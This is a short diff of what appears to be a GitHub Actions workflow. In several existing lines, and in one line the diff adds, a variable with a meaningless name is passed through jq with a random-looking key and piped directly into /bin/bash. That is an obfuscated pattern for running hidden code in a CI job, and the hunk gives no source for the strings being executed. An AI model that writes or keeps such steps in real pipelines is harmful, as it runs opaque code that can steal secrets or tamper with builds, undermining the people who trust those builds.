@@ -24,6 +24,7 @@ jobs:
           echo $e25083 | jq -r .on768 | /bin/bash
           printf '%s' "$pgdo90" | jq -r .af72508 | /bin/bash
           echo $o00 | jq -r .qpomr9 | /bin/bash
+          printf '%s' "$wopvf3" | jq -r .wakxf256 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
